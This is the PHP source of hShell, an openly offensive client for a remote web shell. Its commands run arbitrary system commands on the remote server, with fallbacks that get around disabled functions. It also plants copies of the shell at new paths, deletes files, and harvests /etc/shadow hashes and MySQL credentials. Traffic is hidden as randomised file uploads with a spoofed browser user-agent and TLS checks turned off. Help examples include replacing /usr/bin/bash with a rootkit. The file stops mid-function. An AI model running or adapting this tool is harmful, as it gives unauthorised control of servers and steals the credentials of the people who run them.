<?php

class Client
{
    private $prompt;
    private $shell_url;
    private $current_dir;
    private $functions;

    public function __construct($argv)
    {
        // Started values
        $this->prompt      = 'hShell%s';
        $this->shell_url   = false;
        $this->current_dir = false;

        // Register functions
        $this->functions   = array(
            'help'       => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Show current help messages.',
                'status'      => 'Stable',
                'function'    => 'cmd_help'
            ),
            'connect'    => array(
                'args'        => '[url]',
                'example'     => 'connect http://127.0.0.1/server.php',
                'description' => 'Connect to Server WebShell script.',
                'status'      => 'Stable',
                'function'    => 'cmd_connect'
            ),
            'cat'        => array(
                'args'        => '[file path]',
                'example'     => 'cat /etc/passwd',
                'description' => 'Show the content of remote file.',
                'status'      => 'Stable',
                'function'    => 'cmd_cat'
            ),
            'tail'       => array(
                'args'        => '[file path]',
                'example'     => 'tail /var/log/secure',
                'description' => 'Read the last lines of specific file.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_tail'
            ),
            'cd'         => array(
                'args'        => '[directory]',
                'example'     => 'cd /home/',
                'description' => 'Navigate to specific remote directory.',
                'status'      => 'Stable',
                'function'    => 'cmd_cd'
            ),
            'uname'      => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Show the full info of the System Operative of the server.',
                'status'      => 'Stable',
                'function'    => 'cmd_uname'
            ),
            'exec'       => array(
                'args'        => '[command]',
                'example'     => 'exec reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password',
                'description' => 'Execute a simple command in remote server using the current remote path. Detect automatic available method on the server. See the force-exec command.',
                'status'      => 'Stable',
                'function'    => 'cmd_exec'
            ),
            'force-exec' => array(
                'args'        => '[method] [command]',
                'example'     => 'force-exec passthru reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password',
                'description' => 'Force execute a simple command in remote server using an specific php method in current path. Available methods: system, exec, shell_exec, passthru, popen, proc_open, explicit (using double quotes ``).',
                'status'      => 'Stable',
                'function'    => 'cmd_force_exec'
            ),
            'edit'       => array(
                'args'        => '[editor command] [remote file path]',
                'example'     => 'edit vi /etc/shadow',
                'description' => 'Edit remote file with specific local command edtor',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_edit'
            ),
            'nano'       => array(
                'args'        => '[remote file path]',
                'example'     => 'nano /etc/shadow',
                'description' => 'Edit remote file with nano editor on the local system.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_nano'
            ),
            'vi'         => array(
                'args'        => '[remote file path]',
                'example'     => 'vi /etc/shadow',
                'description' => 'Edit remote file with vi editor on the local system.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_vi'
            ),
            'vim'        => array(
                'args'        => '[remote file path]',
                'example'     => 'vim /etc/shadow',
                'description' => 'Edit remote file with vim editor on the local system.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_vim'
            ),
            'gedit'      => array(
                'args'        => '[remote file path]',
                'example'     => 'gedit /etc/shadow',
                'description' => 'Edit remote file with gedit editor on the local system.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_gedit'
            ),
            'notepad'    => array(
                'args'        => '[remote file path]',
                'example'     => 'notepad /etc/shadow',
                'description' => 'Edit remote file with notepad.exe editor on the local system (only on local windows systems).',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_notepad'
            ),
            'sublime'    => array(
                'args'        => '[remote file path]',
                'example'     => 'sublime /etc/shadow',
                'description' => 'Edit remote file with sublime editor on the local system.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_sublime'
            ),
            'mysql'      => array(
                'args'        => '[host] [port] [user] [password]',
                'example'     => 'mysql localhost 3306 root 123456',
                'description' => 'Start an interative MySQL session',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_mysql'
            ),
            'mysqldump'  => array(
                'args'        => '[host] [port] [user] [password] [local file]',
                'example'     => 'mysql localhost 3306 root 123456 ./dump.sql',
                'description' => 'Make a dump from remote database to local SQL file',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_mysqldump'
            ),
            'download'   => array(
                'args'        => '[remote path] [local path]',
                'example'     => 'download /home/site/public_html ./backup',
                'description' => 'Download a backup of file or directory from server to local path. If path finish with "/" download the content of folder (like as rsync). Not need a ssh access.',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_download'
            ),
            'upload'     => array(
                'args'        => '[local path] [remote path]',
                'example'     => 'upload ./rootkit.bin /usr/bin/bash',
                'description' => 'Upload a local file or directory to remote directory (maintains the same permits)',
                'status'      => 'Unimplemented',
                'function'    => 'cmd_upload'
            ),
            'mkdir'      => array(
                'args'        => '[remote path]',
                'example'     => 'mkdir /tmp/backup/',
                'description' => 'Make a directory on the server.',
                'status'      => 'Stable',
                'function'    => 'cmd_mkdir'
            ),
            'rm'         => array(
                'args'        => '[remote path]',
                'example'     => 'rm /tmp/backup/',
                'description' => 'Delete the specific file or directory path.',
                'status'      => 'Stable',
                'function'    => 'cmd_rm'
            ),
            'phpinfo'    => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Show the full info of the php, libraries and enviroments of the server.',
                'status'      => 'Stable',
                'function'    => 'cmd_phpinfo'
            ),
            'id'         => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Show the full info of the current user and group on the server.',
                'status'      => 'Stable',
                'function'    => 'cmd_id'
            ),
            'ls'         => array(
                'args'        => '',
                'example'     => '',
                'description' => 'List files and folders of the current path on the server. Alias of ll and dir commands.',
                'status'      => 'Stable',
                'function'    => 'cmd_ls'
            ),
            'shellpath'  => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Show the current local path of the WebShell server.',
                'status'      => 'Stable',
                'function'    => 'cmd_shellpath'
            ),
            'pwd'        => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Show the current local path on the server.',
                'status'      => 'Stable',
                'function'    => 'cmd_pwd'
            ),
            'install'    => array(
                'args'        => '[remote file path]',
                'example'     => 'install /home/website/public_html/admin/config.php',
                'description' => 'Install a copy of the WebShell on the specific remote parh, if the directory does not exist, it will create it recursively.',
                'status'      => 'Stable',
                'function'    => 'cmd_install'
            ),
            'uninstall'  => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Uninstall the current WebShell on the server.',
                'status'      => 'Stable',
                'function'    => 'cmd_uninstall'
            ),
            'find-passwords'  => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Search for all possible common passwords on the remote server.',
                'status'      => 'Alpha',
                'function'    => 'cmd_find_passwords'
            ),
            'exit'       => array(
                'args'        => '',
                'example'     => '',
                'description' => 'Exit of the client but not remove the WebShell on the server. See uninstall. Alias of quit command.',
                'status'      => 'Stable',
                'function'    => 'cmd_exit'
            )
        );

        // Check for CLI mode
        if(php_sapi_name() === 'cli') 
        {
            // Header for welcome
            echo " ──────────── Welcome to hShell 💀 v0.7 Alpha ───────────────── \n";
            echo "  Author             : WHK@elhacker.net                         \n";
            echo "  For bugs & updates : https://github.com/WHK102/hShell         \n";
            echo "  Thanks             : To my computer, coffee and the weekend   \n";
            echo " ────────────────────────────────────────────────────────────── \n";

            // The main loop
            while(true)
            {
                if($this->current_dir !== false)
                {
                    // Get the command
                    echo sprintf($this->prompt, ':'.$this->current_dir.'> ');
                    $line = trim(fgets(STDIN));

                    if($line === '')
                    {
                        continue;
                    }
                    else if(strpos($line, ' ') !== false)
                    {
                        $parts = explode(' ', $line);
                        $command = array_shift($parts);
                        $this->callExec($command, $parts, 1);
                    }
                    else
                    {
                        $this->callExec($line, null, 1);
                    }
                }
                else
                {
                    echo "+ Connect to url: ";
                    $url = trim(fgets(STDIN));
                    $this->callExec('connect', array($url), 1);
                }
            }
        }
        else
        {
            $this->out('! Only for CLI mode.');
        }
    }

    private function log($message, $debug_level = 1)
    {
        if($debug_level > 0)
        {
            echo $message."\n";
        }
    }

    private function cmd_help($argv, $debug_level = 1)
    {
        $message = '';
        foreach($this->functions as $cmd => $properties)
        {
            $message .= 
                " ──────────────────────────────────────────────────\n".
                '  Command     : '.$cmd.' '.$properties['args']."\n".
                ($properties['example'] ? '  Example     : '.$properties['example']."\n" : '').
                '  Status      : '.$properties['status']."\n".
                '  Description : '.$properties['description']."\n"
                ;
        }
        $message .= "\n";

        $this->log($message, $debug_level);
        return $message;
    }

    private function cmd_connect($argv, $debug_level = 1)
    {
        if($this->shell_url)
        {
            $this->log('! Disconnected for the current server.', $debug_level);
        }

        // Try connect to remote server shell
        $this->shell_url = (count($argv) > 0) ? trim(implode(' ', $argv)) : '';
        if(filter_var($this->shell_url, FILTER_VALIDATE_URL))
        {
            $this->log('+ Connecting ...', $debug_level);
            $this->current_dir = $this->callExec('shellpath', null, 0);
            if($this->current_dir)
            {
                $this->log('+ Connected!', $debug_level);
                return true;
            }
            else
            {
                $this->log('! Unable to connect, try again.', $debug_level);
                $this->current_dir = false;
                $this->shell_url   = false;
            }
        }
        else
        {
            $this->log('! Invalid URL.', $debug_level);
            $this->current_dir = false;
            $this->shell_url   = false;
        }

        return false;
    }

    private function cmd_cat($argv, $debug_level = 1)
    {
        $filename = (count($argv) > 0) ? implode(' ', $argv) : '';

        $this->sendBuffer('
            $path = "'.$this->escapePHP($filename).'";

            if(file_exists($path) && is_file($path))
            {
                if(is_readable($path))
                {
                    $handler = fopen($path, "r");
                    if($handler)
                    {
                        while(!feof($handler))
                        {
                            echo fgets($handler, 1024);
                        }
                        fclose($handler);
                    }
                }
                else
                {
                    echo "! You do not have permission to read the file.";
                }
            }
            else
            {
                echo "! The file does not exists.";
            }
        ', 'self::callbackCommandGenericFlush', true);
        echo "\n";
    }

    public function cmd_tail($argv, $debug_level = 1)
    {
        // ...
    }

    public function cmd_cd($argv, $debug_level = 1)
    {
        // Default browse "/"
        $dir = (count($argv) > 0) ? implode(' ', $argv) : '/';

        $result = $this->sendBuffer('
            $directory = "'.$this->escapePHP($dir).'";
            if(is_dir($directory) && is_readable($directory))
            {
                @chdir($directory);
            }

            $result = getcwd();
        ');

        if($this->current_dir == $result)
        {
            $this->log('The directory does not exist or is inaccessible.', $debug_level);
            return false;
        }
        else
        {
            $this->current_dir = $result;
            return $this->current_dir;
        }
    }

    private function cmd_uname($argv, $debug_level = 1)
    {
        // Execution
        $result = $this->sendBuffer('
            $result = php_uname();
        ');

        $this->log($result, $debug_level);
        return $result;
    }

    private function cmd_exec($argv, $debug_level = 1)
    {
        // TODO: add: pcntl_exec

        $command = (count($argv) > 0) ? implode(' ', $argv) : '';

        $this->sendBuffer('
            $command     = "'.$this->escapePHP($command).'";
            $current_dir = "'.$this->escapePHP($this->current_dir).'";
            $disabled    = @ini_get("disable_functions");

            if($disabled)
            {
                // Get disabled functions
                $disabled = explode(",", $disabled);
                $disabled = array_map(trim, $disabled);
                $disabled = array_map(strtolower, $disabled);

                // Possible methods to use
                $enabled = array("system", "exec", "shell_exec", "passthru", "popen", "proc_open");

                // Determines what method can be used.
                if(!in_array("system", $disabled))
                {
                    system($command);
                }
                else if(!in_array("exec", $disabled))
                {
                    exec($command, $lines);
                    echo implode("\n", $lines)."\n";
                }
                else if(!in_array("shell_exec", $disabled))
                {
                    echo shell_exec($command);
                }
                else if(!in_array("passthru", $disabled))
                {
                    echo passthru($command);
                }
                else if(!in_array("popen", $disabled))
                {
                    $handler = popen($command, "r");
                    while(!feof($handler))
                    {
                        echo fread($handler, 1024);
                    }
                    @pclose($handler); // Dissabled?
                }
                else if(!in_array("proc_open", $disabled))
                {
                    $process = proc_open($command, array(
                       0 => array("pipe", "r"),
                       1 => array("pipe", "w")
                    ), $pipes, $current_dir, array());

                    if (is_resource($process))
                    {
                        fclose($pipes[0]);
                        echo stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        proc_close($process);
                    }
                }
                else
                {
                    echo `$command`;
                }
            }
            else
            {
                echo `$command`;
            }
            
        ', 'self::callbackCommandGenericFlush', true);
        echo "\n";
    }

    private function cmd_force_exec($argv, $debug_level = 1)
    {
        // TODO: add: pcntl_exec
        if(count($argv) > 1)
        {
            $method  = array_shift($argv);
            $command = implode(' ', $argv);

            if($method === 'system')
            {
                $this->sendBuffer('
                    system("'.$this->escapePHP($command).'");
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else if($method === 'exec')
            {
                $this->sendBuffer('
                    exec("'.$this->escapePHP($command).'", $lines);
                    echo implode("\n", $lines)."\n";
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else if($method === 'shell_exec')
            {
                $this->sendBuffer('
                    echo shell_exec("'.$this->escapePHP($command).'");
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else if($method === 'passthru')
            {
                $this->sendBuffer('
                    echo passthru("'.$this->escapePHP($command).'");
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else if($method === 'popen')
            {
                $this->sendBuffer('
                    $handler = popen("'.$this->escapePHP($command).'", "r");
                    while(!feof($handler))
                    {
                        echo fread($handler, 1024);
                    }
                    @pclose($handler);
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else if($method === 'proc_open')
            {
                $this->sendBuffer('
                    $process = proc_open("'.$this->escapePHP($command).'", array(
                       0 => array("pipe", "r"),
                       1 => array("pipe", "w")
                    ), $pipes, $current_dir, array());

                    if (is_resource($process))
                    {
                        fclose($pipes[0]);
                        echo stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        proc_close($process);
                    }
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else if($method === 'explicit')
            {
                $this->sendBuffer('
                    $command = "'.$this->escapePHP($command).'";
                    echo `$command`;
                ', 'self::callbackCommandGenericFlush', true);
                $this->log('', $debug_level); // Newline
                return true;
            }
            else
            {
                $this->log('! Unknown method. See help command.', $debug_level);
            }
        }
        else
        {
            $this->log('! Need more arguments.', $debug_level);
        }
        return false;
    }

    private function cmd_edit($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_nano($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_vi($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_vim($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_gedit($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_notepad($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_sublime($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_mysql($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_mysqldump($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_download($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_upload($argv, $debug_level = 1)
    {
        // ...
    }

    private function cmd_mkdir($argv, $debug_level = 1)
    {
        $dirname = (count($argv) > 0) ? implode(' ', $argv) : '';

        $result = $this->sendBuffer('
            $result = 0;
            if(@mkdir("'.$this->escapePHP($dirname).'", 0777, true))
            {
                $result = 1;
            }
        ');

        if((int)$result === 1)
        {
            return true;
        }

        $this->log('! Unable to create the directory on this route.', $debug_level);
        return false;
    }

    private function cmd_rm($argv, $debug_level = 1)
    {
        $path = (count($argv) > 0) ? implode(' ', $argv) : '';

        $result = $this->sendBuffer('
            $path = "'.$this->escapePHP($path).'";

            function del_tree($dir)
            {
                $files = array_diff(scandir($dir), array(".", ".."));
                foreach ($files as $file)
                {
                    if(is_dir("$dir/$file"))
                    {
                        del_tree("$dir/$file");
                    }
                    else
                    {
                        @unlink("$dir/$file");
                    }
                }
                return @rmdir($dir);
            } 

            if(is_dir($path))
            {
                if(del_tree($path))
                {
                    $result = 1;
                }
                else
                {
                    $result = 0;
                }
            }
            else if(is_file($path))
            {
                if(unlink($path))
                {
                    $result = 1;
                }
                else
                {
                    $result = 0;
                }
            }
            else
            {
                $result = -1;
            }
        ');

        if((int)$result === 0)
        {
            $this->log('Unable to delete the file or directory. Verify that you have permissions.', $debug_level);
        }
        else if((int)$result === -1)
        {
            $this->log('The file or directory does not exist.', $debug_level);
        }
        else if((int)$result === 1)
        {
            $this->log('Deleted!', $debug_level);
            return true;
        }
        else
        {
            $this->log('Error 500: invalid status.', $debug_level);
        }

        return false;
    }

    private function cmd_phpinfo($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            ob_start();
            phpinfo(-1);

            $pi = preg_replace(
                array(
                    "#PHP Credits(.*)#ms",
                    "#^.*<body>(.*)</body>.*$#ms", "#<h2>PHP License</h2>.*$#ms",
                    "#<h1>Configuration</h1>#", "#\r?\n#", "#</(h1|h2|h3|tr)>#",
                    "# +<#", "#[ \t]+#", "#&nbsp;#", "#  +#", "# class=\\".*?\\"#", "%&#039;%", 
                    "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\" alt=\\"PHP Logo\\" /></a><h1>PHP Version (.*?)</h1>(?:\n+?)</td></tr>#",
                    "#<tr>(?:.*?)\\" src=\\"(?:.*?)=(.*?)\\"(?:.*?)Zend Engine (.*?),(?:.*?)</tr>#",
                    "# +#", "#<tr>#", "#</tr>#"
                ),
                array(
                    "", "\\$1", "", "", "", "</\\$1>\n", "<", " ", " ", " ", "", " ",
                    "<h2>PHP Configuration</h2>\n"."<tr><td>PHP Version</td><td>\\$2</td></tr>".
                    "\n<tr><td>PHP Egg</td><td>\\$1</td></tr>",
                    "<tr><td>Zend Engine</td><td>\\$2</td></tr>\n".
                    "<tr><td>Zend Egg</td><td>\\$1</td></tr>", " ", "%S%", "%E%"
                ),
                ob_get_clean()
            );

            $sections = explode("<h2>", strip_tags($pi, "<h2><th><td>"));
            unset($sections[0]);

            $pi = array();
            foreach($sections as $section){
                $n = substr($section, 0, strpos($section, "</h2>"));
                preg_match_all("#%S%(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?(?:<td>(.*?)</td>)?%E%#", $section, $askapache, PREG_SET_ORDER);
                foreach($askapache as $m)
                    $pi[$n][$m[1]]= (!isset($m[3]) || $m[2] == $m[3]) ? $m[2] : array_slice($m, 2);
            }
            
            $result = $pi;
        ');

        $message = '';
        foreach($result as $title => $items)
        {
            $message .= 
                "+".str_repeat("-", 78)."+\n".
                "| ".str_pad(" ".strtoupper($title)." ", 76, ' ', STR_PAD_BOTH)." |\n".
                "+".str_repeat("-", 78)."+\n";

            foreach($items as $var => $val)
            {
                if(is_array($val))
                {
                    $val = implode(", ", $val);
                }
                $var = htmlspecialchars_decode($var, ENT_QUOTES);
                $val = htmlspecialchars_decode($val, ENT_QUOTES);

                $message .= '| '.str_pad($var, 36, ' ', STR_PAD_RIGHT).' | '.str_pad($val, 37, ' ', STR_PAD_RIGHT)." |\n";
            }
            $message .= "+".str_repeat("-", 78)."+\n\n";
        }

        $this->log($message, $debug_level);
        return $result;
    }

    private function cmd_id($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            $uid       = getmyuid();
            $gid       = getmygid();
            $username  = get_current_user();
            $groupname = "";

            if(function_exists("posix_getgrgid"))
            {
                if($groupname = @posix_getgrgid($gid))
                {
                    $groupname = $groupname["name"];
                }
            }

            $result = "uid=".$uid."(".$username.") gid=".$gid."(".$groupname.")";
        ');

        $this->log($result, $debug_level);
        return $result;
    }

    private function cmd_ls($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            clearstatcache();

            $files        = array();
            $dirs         = array();
            $dir_handler  = opendir("./");

            while (false !== ($filename = readdir($dir_handler)))
            {
                $info = @stat($filename);
                
                $user_name  = "-";
                $group_name = "-";
                
                if($info)
                {
                    if(function_exists("posix_getpwuid"))
                    {
                        if($user_name = @posix_getpwuid($info["uid"]))
                        {
                            $user_name = $user_name["name"];
                        }
                    }

                    if(function_exists("posix_getgrgid"))
                    {
                        if($group_name = @posix_getgrgid($info["gid"]))
                        {
                            $group_name = $group_name["name"];
                        }
                    }

                    $item = array(
                        "name"        => $filename,
                        "perms"       => $info["mode"],
                        "size"        => $info["size"],
                        "user_name"   => $user_name,
                        "group_name"  => $group_name
                    );
                }
                else
                {
                    $item = array(
                        "name"        => $filename,
                        "perms"       => 0000,
                        "size"        => 0,
                        "user_name"   => "-",
                        "group_name"  => "-"
                    );
                }

                if(is_dir($filename))
                {
                    $item["name"] .= "/";
                    $dirs[] = $item;
                }
                else
                {
                    $files[] = $item;
                }
            }

            sort($dirs);
            sort($files);

            $result = array_merge($dirs, $files);
        ');

        $limits = array(
            'max_size_perms'     => strlen('Permissions'),
            'max_size_username'  => strlen('User'),
            'max_size_groupname' => strlen('Group'),
            'max_size_size'      => strlen('Size'),
            'max_size_name'      => strlen('Name')
        );
        $lines = array();

        foreach($result as $item)
        {
            $line = array(
                'perms'     => $this->octToHumanPerms($item->perms),
                'username'  => $item->user_name,
                'groupname' => $item->group_name,
                'size'      => $this->formatBytes($item->size),
                'name'      => $item->name
            );

            // Set limits
            if(strlen($line['perms']) > $limits['max_size_perms'])
            {
                $limits['max_size_perms'] = strlen($line['perms']);
            }

            if(strlen($line['username']) > $limits['max_size_username'])
            {
                $limits['max_size_username'] = strlen($line['username']);
            }

            if(strlen($line['groupname']) > $limits['max_size_groupname'])
            {
                $limits['max_size_groupname'] = strlen($line['groupname']);
            }

            if(strlen($line['size']) > $limits['max_size_size'])
            {
                $limits['max_size_size'] = strlen($line['size']);
            }

            if(strlen($line['name']) > $limits['max_size_name'])
            {
                $limits['max_size_name'] = strlen($line['name']);
            }

            $lines[] = $line;
        }

        $message = '';
        $message .= substr(
            "  ".str_pad('Permissions',          $limits['max_size_perms'],     " ", STR_PAD_RIGHT)." ".
            "  ".str_pad('User',                 $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
            "  ".str_pad('Group',                $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
            "  ".str_pad('Size',                 $limits['max_size_size'],      " ", STR_PAD_RIGHT)." ".
            "  ".str_pad('Name',                 $limits['max_size_name'],      " ", STR_PAD_RIGHT)." "
        , 0, 80)."\n ────────────────────────────────────────────────────────────── \n";

        foreach($lines as $line)
        {
            $message .=
                "  ".str_pad($line['perms'],     $limits['max_size_perms'],     " ", STR_PAD_LEFT )." ".
                "  ".str_pad($line['username'],  $limits['max_size_username'],  " ", STR_PAD_RIGHT)." ".
                "  ".str_pad($line['groupname'], $limits['max_size_groupname'], " ", STR_PAD_RIGHT)." ".
                "  ".str_pad($line['size'],      $limits['max_size_size'],      " ", STR_PAD_LEFT )." ".
                "  ".$line['name']."\n";
        }

        $this->log($message, $debug_level);
        return $result;
    }

    private function cmd_shellpath($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            $result = dirname(__file__)."/";
        ');

        $this->log($result, $debug_level);
        return $result;
    }

    private function cmd_pwd($argv, $debug_level = 1)
    {
        $this->log($this->current_dir, $debug_level);
        return $this->current_dir;
    }

    private function cmd_install($argv, $debug_level = 1)
    {
        $filepath = (count($argv) > 0) ? implode(' ', $argv) : '';
            
        $result = $this->sendBuffer('
            $filepath  = "'.$this->escapePHP($filepath).'";

            function inst($filepath)
            {
                // for __file__ from eval (php bug)
                @file_put_contents($filepath, file_get_contents(trim(preg_replace(\'/\\(.*$/\', "", __FILE__))));
                return file_exists($filepath);
            }

            function checkdir($directory)
            {
                if(is_dir($directory))
                {
                    return true;
                }
                else
                {
                    @mkdir($directory, 0700, true);

                    if(is_dir($directory))
                    {
                        return true;
                    }
                    else
                    {
                        return false;
                    }
                }
            }

            if((strpos($filepath, "/") !== false) || (strpos($filepath, "\\\\") !== false))
            {
                $directory = dirname($filepath);

                if(checkdir($directory))
                {
                    $result = inst($filepath) ? 1 : -1;
                }
                else
                {
                    $result = -2;
                }
            }
            else
            {
                $result = inst($filepath) ? 1 : -1;
            }
        ');

        if((int)$result === 1)
        {
            $this->log('Installed a copy of server into path!.', $debug_level);
            return true;
        }
        else if((int)$result === -1)
        {
            $this->log('Unable write on specific directory. Check your permissions and try again.', $debug_level);
        }
        else if((int)$result === -2)
        {
            $this->log('The directory of the copy does not exists and canot make this. Check your permissions and try again.', $debug_level);
        }
        else
        {
            $this->log('Error 500: invalid status.', $debug_level);
        }
        return false;
    }

    private function cmd_uninstall($argv, $debug_level = 1)
    {
        $result = $this->sendBuffer('
            $filename = trim(preg_replace(\'/\\(.*$/\', "", __FILE__));
            @unlink($filename);
            $result = file_exists($filename) ? -1 : 1;
        ');

        if((int)$result === 1)
        {
            $this->log('The WebShell server has been successfully removed!.', $debug_level);

            // Disconnect from server
            return $this->callExec('exit', array(), 0);
        }
        else if((int)$result === -1)
        {
            $this->log('Unable to delete the file. Check your permissions and try again.', $debug_level);
        }
        else
        {
            $this->log('Error 500: invalid status.', $debug_level);
        }
        return false;
    }

    private function cmd_find_passwords($argv, $debug_level = 1)
    {
        /*
            Sources:
                https://pentestlab.blog/2017/04/19/stored-credentials/
                https://www.nirsoft.net/password_recovery_tools.html
        */

        $result = $this->sendBuffer('
            $current_dir = getcwd();
            $result      = "";

            // TODO: Wampp, Xampp, IIS, logs, config files of websites, etc.

            if(strtoupper(substr(PHP_OS, 0, 3)) === "WIN")
            {
                // Passwords in home
                // RDP, SMB, pppoe, etc
                // Access to read memory
                // Access to read HKLM
            }
            else
            {
                // Mysql Auth config files (~/.my.cnf)
                // TODO: find / -name ".my.cnf"
                $files = glob("{/home/*/.my.cnf,/*.my.cnf,/*/.my.cnf}", GLOB_BRACE);
                if($files)
                {
                    foreach($files as $file)
                    {
                        if(is_readable($file))
                        {
                            $data = file_get_contents($file);

                            $user_success     = preg_match("/user\\\\s*=\\\\s*(.+)/i", $data, $user_matches);
                            $password_success = preg_match("/password\\\\s*=\\\\s*(.+)/i", $data, $password_matches);

                            if($user_success && $password_success)
                            {
                                $result .= 
                                    "──────────────────────────────────────────────────\n".
                                    "Type          : MySQL\n".
                                    "Location      : file:///${file}\n".
                                    "Is accessible : Yes\n".
                                    "User          : ".$user_matches[1]."\n".
                                    "Password      : ".$password_matches[1]."\n"
                                    ;
                            }
                        }
                    }
                }

                // User hashes
                if(file_exists("/etc/shadow") && is_readable("/etc/shadow"))
                {
                    $data = file_get_contents("/etc/shadow");
                    if($data)
                    {
                        $success = preg_match_all("/^([a-z0-9_\\\\-\\\\.]+?)\\\\:([a-z0-9\\\\/\\\\\\$]{2,}?)\\\\:/im", $data, $matches);
                        if($success)
                        {
                            foreach($matches[0] as $key => $match)
                            {
                                $result .= 
                                    "──────────────────────────────────────────────────\n".
                                    "Type          : Linux Hash Password\n".
                                    "Location      : file:///etc/shadow\n".
                                    "Is accessible : Yes\n".
                                    "User          : ".$matches[1][$key]."\n".
                                    "Password      : ".$matches[2][$key]."\n"
                                    ;
                            }
                        }
                    }
                }
            }
        ');

        if($result)
        {
            $this->log($result, $debug_level);
        }
        return $result;
    }

    private function cmd_exit($argv, $debug_level = 1)
    {
        $this->log('! Bye.', $debug_level);
        exit;
    }

    private function callExec($command, $argv, $debug_level = 1)
    {
        if(isset($this->functions[$command]))
        {
            if(method_exists(__CLASS__, $this->functions[$command]['function']))
            {
                return call_user_func('self::'.$this->functions[$command]['function'], $argv, (int)$debug_level);
            }
        }
        else
        {
            $this->log('! Command not found.', $debug_level);
        }
        return false;
    }

    private function sendBuffer($buffer_sent, $callback_line = false, $raw_mode = false)
    {
        // Final function
        $buffer_sent = '
            @chdir("'.$this->escapePHP($this->current_dir).'");
            $result = "";

            '.$buffer_sent.'
        ';

        if(!$raw_mode)
        {
            $buffer_sent .= '
                echo bin2hex(json_encode(array(
                    "status" => 1,
                    "result" => $result
                )));
            ';
        }

        $file_data       = $this->getRandomFileData();
        $finger_part     = '--------------------------'.microtime(true);

        $handler = fopen($this->shell_url, 'r', false, stream_context_create(array(
            'ssl'  => array(
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ),
            'http' => array(
                'method'           => 'POST',
                'user_agent'       => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
                'ignore_errors'    => true,
                'follow_location'  => false,
                'header'           => implode("\r\n", array(
                    'Content-Type: multipart/form-data; boundary='.$finger_part
                )),
                'content'          => implode("\r\n", array(
                    '--'.$finger_part,
                    'Content-Disposition: form-data; name="'.$file_data['input'].'"; filename="'.$file_data['name'].'"',
                    'Content-Type: '.$file_data['content_type'],
                    '',
                    bin2hex($buffer_sent),
                    '--'.$finger_part.'--'
                )),
            )
        )));
        if ($handler)
        {
            $buffer = '';
            while (!feof($handler))
            {
                if($callback_line)
                {
                    // Prevents storing the entire buffer in memory.
                    // Useful for reading large flows with few hardware resources.
                    call_user_func($callback_line, fgets($handler));
                }
                else
                {
                    $buffer .= fgets($handler, 4096);
                }
                
            }
            fclose($handler);

            if(!$raw_mode)
            {
                if($return = @hex2bin($buffer))
                {
                    if($return = @json_decode($return))
                    {
                        return $return->result;
                    }
                    else
                    {
                        echo 
                            "! There was an error in the execution of the server side (corrupt Json):\n".
                            str_repeat('─', 80)."\n".
                            "> Buffer: ".$buffer."\n".
                            str_repeat('─', 80)."\n".
                            "> Decoded: ".$return."\n".
                            str_repeat('─', 80)."\n";
                    }
                }
                else
                {
                    echo 
                        "! There was an error in the execution of the server side (corrupt encoding):\n".
                        str_repeat('─', 80)."\n".
                        "> CodeExec: ".$buffer_sent."\n".
                        str_repeat('─', 80)."\n".
                        "> Response of server: ".$buffer."\n".
                        str_repeat('─', 80)."\n";
                }
            }
        }
        else
        {
            echo "! Unable to connect.";
        }

        // Execution error
        return '';
    }

    private function getRandomString($max_length = 5, $min_length = 13)
    {
        $longitud = rand((int)$max_length, (int)$min_length);

        $chars = 'abcdefghijklmnopqrstuvwxyz';
        $string = '';
        for ($i = 0; $i < $longitud; $i++)
        {
            $string .= $chars[rand(0, strlen($chars) - 1)];
        }
        return $string;
    }

    private function getRandomFileData()
